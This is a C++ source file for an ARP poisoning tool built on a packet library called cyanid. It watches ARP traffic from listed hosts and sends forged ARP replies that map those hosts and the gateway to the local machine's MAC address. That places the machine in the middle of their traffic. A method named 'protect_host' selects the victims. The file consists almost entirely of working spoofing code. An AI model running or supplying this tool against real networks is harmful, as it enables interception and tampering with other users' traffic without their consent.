#include "poisoner.hpp"

#include <cyanid.hpp>

#include <iostream>
#include <algorithm>
#include <list>
#include <sstream>
#include <string>
#include <thread>

using namespace std;
using namespace cyanid;

Poisoner::Poisoner(device& dev,
        const list<string>& hosts,
        const string& gateway_ip,
        const string& gateway_mac) :
    listener(dev),
    hosts(hosts),
    gateway_ip(gateway_ip),
    gateway_mac(gateway_mac)
{
    init(dev);
}

Poisoner::Poisoner(Poisoner&& p) : 
    listener(p.get_device()),
    hosts(p.hosts),
    gateway_ip(p.gateway_ip),
    gateway_mac(p.gateway_mac)
{
    init(p.get_device());
}

void Poisoner::init(const cyanid::device& dev)
{
    mac_addr = utils::mac_to_str(dev.get_mac());
    ip_addr  = utils::addr4_to_str(dev.get_ip());

    stringstream filter;
    filter << "arp and not (ether src host " << mac_addr << ")";
    apply_filter(filter.str());
}

void Poisoner::handle_packet(const raw_packet& packet)
{
    const size_t pkt_size = packet.packet_header()->len;
    const size_t arp_size = pkt_size - builder::ethernet::header_size;

    if (arp_size < builder::arp::header_size) return;

    builder::ethernet eth(packet.payload(), pkt_size);
    builder::arp      arp(eth.payload(),    arp_size);

    if (arp.sha() == mac_addr) return;
    if (!protect_host(arp.spa()) && !protect_host(arp.tpa())) return;

    dump_arp_packet(arp);

    if (protect_host(arp.spa())) {
        this_thread::sleep_for(chrono::seconds(1));

        if (arp.oper() == builder::arp::REQUEST) {
            poison_target(arp.tpa(), arp.spa(), arp.sha());
        } else {
            poison_target(gateway_ip, arp.spa(), arp.sha());
        }

        poison_target(arp.spa(), gateway_ip, gateway_mac);
    }
}

void Poisoner::poison_target(const string& spa,
        const string& tpa,
        const string& tha)
{
    const cyanid::device& dev(get_device());

    cyanid::packet pkt(dev);

    pkt.build<cyanid::builder::arp>()(
            cyanid::builder::arp::REPLY,
            mac_addr, spa, tha, tpa);

    pkt.build<cyanid::builder::ethernet>()(
            tha,
            cyanid::builder::arp::ETHER_TYPE);

    cerr << ">> Sending ARP reply to " << tpa << " (" << tha << "): " << endl
        << "-- " << spa << " is at " << mac_addr << "\n\n";

    pkt.dispatch();
}

void Poisoner::operator()()
{
    run();
}

bool Poisoner::protect_host(const std::string& h)
{
    return count(hosts.begin(), hosts.end(), h) > 0;
}

void Poisoner::dump_arp_packet(const builder::arp& arp)
{
    if (arp.oper() == builder::arp::REQUEST) {
        cout << "<< Got ARP request: Who-has " << arp.tpa()
            << " tell " << arp.spa() << "\n\n";
    } else {
        cout << "<< Got ARP reply: " << arp.spa()
            << " is at " << arp.sha() << "\n\n";
    }
}
